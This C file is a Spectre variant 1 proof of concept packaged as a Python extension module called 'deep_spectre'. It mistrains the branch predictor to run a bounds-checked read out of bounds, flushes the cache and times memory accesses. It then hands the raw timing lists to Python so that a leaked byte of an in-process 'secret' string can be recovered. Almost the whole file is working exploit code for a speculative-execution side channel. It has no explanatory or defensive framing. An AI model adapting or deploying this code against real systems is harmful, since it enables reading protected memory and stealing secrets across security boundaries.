#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#include <Python.h>

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char * train_str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890. ";
char * secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x) {
  if (x < array1_size) {
    temp &= array2[array1[x] * 512];
  }
}

/********************************************************************
Analysis code
********************************************************************/

/* Read a byte and report access timing */
void readMemoryByte(size_t malicious_x, uint64_t times[256]) {
  static int results;
  int i, j, mix_i, junk = 0;
  size_t x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;

  /* Flush array2[256*(0..255)] from cache */
  for (i = 0; i < 256; i++)
    _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */

  /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
  for (j = 29; j >= 0; j--) {
    _mm_clflush( & array1_size);
    for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

    /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
    /* Avoid jumps in case those tip off the branch predictor */
    x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
    x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
    x = 0 ^ (x & (malicious_x ^ 0));

    /* Call the victim! */
    victim_function(x);
  }

  /* Time reads. Order is lightly mixed up to prevent stride prediction */
  for (i = 0; i < 256; i++) {
    mix_i = ((i * 167) + 13) & 255;
    addr = & array2[mix_i * 512];
    time1 = __rdtscp( & junk); /* READ TIMER */
    junk = * addr; /* MEMORY ACCESS TO TIME */
    time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
    times[mix_i] = time2;
  }

  results ^= junk; /* use junk so code above won’t get optimized out*/
}

/********************************************************************
Python Glue
********************************************************************/

static PyObject * py_read(size_t malicious_x, uint8_t pos) {
  uint32_t i;
  uint64_t times[256];

  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

  readMemoryByte(malicious_x + pos, times);

  PyObject *l = PyList_New(256);
  for (i = 0; i < 256; i++)
    PyList_SetItem(l, i, PyLong_FromLong(times[i]));
  
  return l;
}

static PyObject * deep_spectre_train(PyObject *self, PyObject *args) {
  uint8_t pos = 0;

  PyArg_ParseTuple(args, "b", &pos);

  size_t malicious_x = (size_t)(train_str - (char * ) array1); /* default for malicious_x */

  return py_read(malicious_x, pos);
}

static PyObject * deep_spectre_secret(PyObject *self, PyObject *args) {
  uint8_t pos = 0;

  PyArg_ParseTuple(args, "b", &pos);

  size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */

  return py_read(malicious_x, pos);
}

static PyObject * deep_spectre_train_str(PyObject *self, PyObject *args) {
  return Py_BuildValue("s", train_str);
}

static PyMethodDef DeepSpectreMethods[] = {
    {"train",      deep_spectre_train,     METH_VARARGS, "Surreptitiously read a training byte from memory"},
    {"read",       deep_spectre_secret,    METH_VARARGS, "Surreptitiously read a secret byte from memory"},
    {"train_str",  deep_spectre_train_str, METH_VARARGS, "Return the training string"},
    {NULL, NULL, 0, NULL}        /* Sentinel */
};

static struct PyModuleDef deep_spectre_module = {
    PyModuleDef_HEAD_INIT,
    "deep_spectre",   /* name of module */
    NULL,             /* module documentation, may be NULL */
    -1,               /* size of per-interpreter state of the module,
                       or -1 if the module keeps state in global variables. */
    DeepSpectreMethods
};

PyMODINIT_FUNC
PyInit_deep_spectre(void) {
    return PyModule_Create(&deep_spectre_module);
}
